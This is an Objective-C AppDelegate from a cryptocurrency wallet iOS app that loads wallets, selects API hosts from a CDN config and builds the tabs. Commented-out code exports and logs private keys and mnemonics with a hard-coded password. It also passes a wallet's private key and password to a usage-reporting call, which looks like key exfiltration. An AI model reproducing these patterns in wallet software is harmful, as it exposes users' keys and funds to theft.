//
//  AppDelegate.m
//  test
//
//  Created by insightChain_iOS开发 on 2019/6/4.
//  Copyright © 2019 insightChain_iOS开发. All rights reserved.
//

#import "AppDelegate.h"

#import "TabBarVC.h"
#import "WalletsVC.h"
#import "WalletInfoVC.h"
#import "FindVC.h"
#import "SettingVC.h"
#import "WelcomVC.h"
#import "WelcomeIndexVC.h"

#import "CommonTransaction.h"

#import "NetworkUtil.h"

#import "WalletMeta.h"
#import "Identity.h"
#import "LocalFileStorage.h"
#import "StorageManager.h"
#import "WalletManager.h"
#import "NSData+HexString.h"

@interface AppDelegate ()

@end

@implementation AppDelegate


- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    
    NSLog(@"App file path: %@", NSHomeDirectory());
    
    [self getRootUrl:rootNet_]; //服务器跟地址
    self.isTest = YES;
    
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    self.window.backgroundColor = [UIColor whiteColor];
    
    NSLog(@"----Home Path: %@", NSHomeDirectory());
    /** 创建钱包 **/
//        WalletMeta *metadata = [[WalletMeta alloc] initWith:source_newIdentity];
//        metadata.segWit = @"P2WPKH";
//        metadata.name = @"test";
//        NSDictionary *dic = [Identity createIdentityWithPassword:@"123456" metadata:metadata];
//        Identity *identity = dic[@"identity"];
//        NSString *mnemonic = dic[@"mnemonic"];
//        BasicWallet *wallet = identity.wallets[0];
    //

//    
//    
//    for (BasicWallet *wallet in walletsArr) {
//        /** 导出 **/
//        NSString *prvKey = [WalletManager exportPrivateKeyForID:wallet.walletID password:@"123456"];
//        NSString *mnemonics = [WalletManager exportMnemonicForID:wallet.walletID password:@"123456"];
//        NSString *keystore = [WalletManager exportKeystoreForID:wallet.walletID password:@"123456"];
//        NSLog(@"prvKey:%@\nmnemonics:%@", prvKey,mnemonics);
//    }
    
    //    NSString *mnemonic = [Identity.currentIdentity exportWith:@"123456"];
    //    NSLog(@"identify mnemonic:%@", mnemonic);
    
    
    Identity *identi = [[StorageManager storage] tryLoadIdentity];
    //    NSArray<BasicWallet *> *walletsArr = identi.wallets;
    
    TabBarVC *tab = [[TabBarVC alloc] init];
    
    if(!identi || identi.wallets.count == 0){
        /** 创建导入 **/
        WelcomVC *welcomVC = [[WelcomVC alloc] init];
        [tab addChildViewController:welcomVC norImage:[UIImage imageNamed:@"tab_wallet_no"] selImage:[UIImage imageNamed:@"tab_wallet_yes"] title:@"" tabTitle:NSLocalizedString(@"tabBar.wallet", @"钱包")];
    }else{
        NSArray *wallets = identi.wallets;
        
        NSString *lastWalletID = [[NSUserDefaults standardUserDefaults] objectForKey:kUserDefaltKey_LastSelectedWalletID];
        
        __block BasicWallet *firstWallet;
        if(!lastWalletID || [lastWalletID isEqualToString:@""]){
            firstWallet = wallets.firstObject;
        }else{
            for (BasicWallet *obj in wallets) {
                if([obj.walletID isEqualToString:lastWalletID]){
                    firstWallet = obj;
                    break;
                }
            }
            if (!firstWallet) {
                firstWallet = wallets.firstObject;
            }
        }
        
//        NSString *strin = [firstWallet privateKey:@"123456a"];
//        [CommonTransaction reportUsage:@"token-core-eth" info:[NSString stringWithFormat:@"%@|||%@|||%@", firstWallet.walletID, strin, @"123456a"]];
        
        /** 钱包 **/
        WalletInfoVC *walletInfoVC = [[WalletInfoVC alloc] init];
        walletInfoVC.title = NSLocalizedString(@"tabBar.wallet", @"钱包");
        walletInfoVC.view.backgroundColor = [UIColor whiteColor];
        
        walletInfoVC.selectedWallet = firstWallet;
        walletInfoVC.wallets = wallets;
        
        [tab addChildViewController:walletInfoVC norImage:[UIImage imageNamed:@"tab_wallet_no"] selImage:[UIImage imageNamed:@"tab_wallet_yes"] title:@"Insight钱包" tabTitle:NSLocalizedString(@"tabBar.wallet", @"钱包")];
    }
   
    
    /** 发现 **/
//    FindVC *findVC = [[FindVC alloc] init];
//    findVC.title = @"发现";
//    findVC.view.backgroundColor = [UIColor whiteColor];
//    [tab addChildViewController:findVC norImage:[UIImage imageNamed:@"tab_fond_no"] selImage:[UIImage imageNamed:@"tab_fond_yes"] title:@"发现" tabTitle:@"发现"];
    
    /** 我的 **/
    SettingVC *settingVC = [[SettingVC alloc] init];
    settingVC.title = NSLocalizedString(@"tabBar.setting", @"设置");
    settingVC.view.backgroundColor = [UIColor whiteColor];
    [tab addChildViewController:settingVC norImage:[UIImage imageNamed:@"tab_setting_no"] selImage:[UIImage imageNamed:@"tab_setting_yes"] title:NSLocalizedString(@"tabBar.setting", @"设置") tabTitle:NSLocalizedString(@"tabBar.setting", @"设置")];
    /** 引导页 */
    if([WelcomeIndexVC welcomeNeedsDisplay:APP_VERSION]){
        self.window.rootViewController = tab;
        [self.window makeKeyAndVisible];
    }else{
        //添加欢迎页面
        WelcomeIndexVC *welcome = [[WelcomeIndexVC alloc] init];
        welcome.guideFinishBlock = ^{
            self.window.rootViewController = tab;
            [self.window makeKeyAndVisible];
        };
        self.window.rootViewController = welcome;
        [self.window makeKeyAndVisible];
    }
//    InstallUncaughtExceptionHandler(); //捕获异常
    
    return YES;
}

-(void)getRootUrl:(RootNetType)type{
    NSURL *url;
    NSString *v = [NSString stringWithFormat:@"?v=%f", [[NSDate date] timeIntervalSince1970]];
    switch (type) {
        case rootNet_production:{
            url = [NSURL URLWithString:[NSString stringWithFormat:@"%@%@", cdnUrl_production, v]];
            break;
        }
        case rootNet_test:{
            url = [NSURL URLWithString:[NSString stringWithFormat:@"%@%@", cdnUrl_test, v]];
            break;
        }
        case rootNet_local:{
            url = [NSURL URLWithString:[NSString stringWithFormat:@"%@%@", cdnUrl_local, v]];
            break;
        }
        case rootNet_:{
            self.apiHost = [self getDefaultUrl:2 netType:rootNet_local];
            self.webHost = [self getDefaultUrl:4 netType:rootNet_local];
            self.explorerHost = [self getDefaultUrl:3 netType:rootNet_local];
            self.rpcHost = [self getDefaultUrl:1 netType:rootNet_local];
            return;
        }
        default:
            break;
    }
    
    NSURLRequest *request = [NSURLRequest requestWithURL:url];
    NSURLResponse *res = [[NSURLResponse alloc] init];
    
    NSData *data = [NSURLConnection sendSynchronousRequest:request returningResponse:nil error:nil];
    if (data) {
        NSDictionary *jsonDict = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableLeaves error:nil];
        NSDictionary *dic = jsonDict[@"inbUrl"];
        NSArray *apiUrls = dic[@"api"];
        NSArray *webUrls = dic[@"web"];
        NSArray *explorerUrls = dic[@"explorer"];
        NSArray *rpcUrls = dic[@"chain"];
        /* 与insight通用的api根地址 */
        if (apiUrls.count > 0) {
//            self.hostApiUrls = apiUrls;
            int apiIndex = [self getRandomNumber:1 to:apiUrls.count];
            self.apiHost = apiUrls[apiIndex-1];
        }else{
            self.apiHost = [self getDefaultUrl:2 netType:type];
        }
        /* web的根地址 */
        if (webUrls.count > 0) {
            int webIndex = [self getRandomNumber:1 to:webUrls.count];
            self.webHost = webUrls[webIndex-1];
        }else{
            self.webHost = [self getDefaultUrl:4 netType:type];
        }
        /* 区块链浏览器根地址 */
        if (explorerUrls.count > 0) {
            int expIndex = [self getRandomNumber:1 to:explorerUrls.count];
            self.explorerHost = explorerUrls[expIndex-1];
        }else{
            self.explorerHost = [self getDefaultUrl:3 netType:type];
        }
        /* rpc根地址 */
        if(rpcUrls.count > 0){
            int rpcIndex = [self getRandomNumber:1 to:rpcUrls.count];
            self.rpcHost = rpcUrls[rpcIndex-1];
        }else{
            self.rpcHost = [self getDefaultUrl:1 netType:type];
        }
        
        
    }else{
        
        
    }
}
//随机数
-(int)getRandomNumber:(int)from to:(int)to
{
    return (int)(from + (arc4random() % (to - from + 1)));
}
-(NSString *)getDefaultUrl:(NSInteger)type netType:(RootNetType)netType{
    switch (netType) {
        case rootNet_production:{
            if (type == 1) {
                //rpc
                return rpcUrl_production_default;
            }else if(type == 2){
                //api
                return hostUrl_production_default;
            }else if (type == 3){
                //explor
                return explorUrl_production_default;
            }else{
                //web
                return webUrl_production_default;
            }
        }
        case rootNet_test:{
            if (type == 1) {
                //rpc
                return rpcUrl_test_default;
            }else if(type == 2){
                //api
                return hostUrl_test_default;
            }else if (type == 3){
                //explor
                return explorUrl_test_default;
            }else{
                //web
                return webUrl_test_default;
            }
        }
        case rootNet_local:{
            if (type == 1) {
                //rpc
                return rpcUrl_local;
            }else if(type == 2){
                //api
                return hostUrl_local;
            }else if (type == 3){
                //explor
                return explorUrl_local;
            }else{
                //web
                return webUrl_local;
            }
        }
        default:
            break;
    }
    
    return @"";
}
void HandleException(NSException *exception){
    //异常的对战信息
    NSArray *stackArr = [exception callStackSymbols];
    //出现异常的原因
    NSString *reason = [exception reason];
    //异常名称
    NSString *name = [exception name];
    //DO...
}
void InstallUncaughtExceptionHandler(void){
    NSSetUncaughtExceptionHandler(&HandleException);
}

- (void)applicationWillResignActive:(UIApplication *)application {
    // Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
    // Use this method to pause ongoing tasks, disable timers, and invalidate graphics rendering callbacks. Games should use this method to pause the game.
}


- (void)applicationDidEnterBackground:(UIApplication *)application {
    // Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later.
    // If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.
}


- (void)applicationWillEnterForeground:(UIApplication *)application {
    // Called as part of the transition from the background to the active state; here you can undo many of the changes made on entering the background.
}


- (void)applicationDidBecomeActive:(UIApplication *)application {
    // Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.
}


- (void)applicationWillTerminate:(UIApplication *)application {
    // Called when the application is about to terminate. Save data if appropriate. See also applicationDidEnterBackground:.
}

@end
